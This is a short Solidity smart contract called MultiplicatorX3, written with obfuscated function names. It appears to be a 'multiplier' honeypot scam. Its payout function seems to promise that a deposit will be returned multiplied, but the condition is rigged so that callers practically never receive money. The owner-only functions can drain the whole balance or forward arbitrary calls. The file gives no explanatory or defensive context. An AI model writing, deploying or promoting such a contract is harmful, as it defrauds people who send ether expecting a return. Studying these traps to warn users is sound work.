// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;

    function() public payable{}

    function _0x7f5fb1()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _0x54c3b9,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        _0x54c3b9.call.value(msg.value)(data);
    }

    function _0x3af578(address _0x54c3b9)
    public
    payable
    {
        if(msg.value>=this.balance)
        {
            _0x54c3b9.transfer(this.balance+msg.value);
        }
    }
}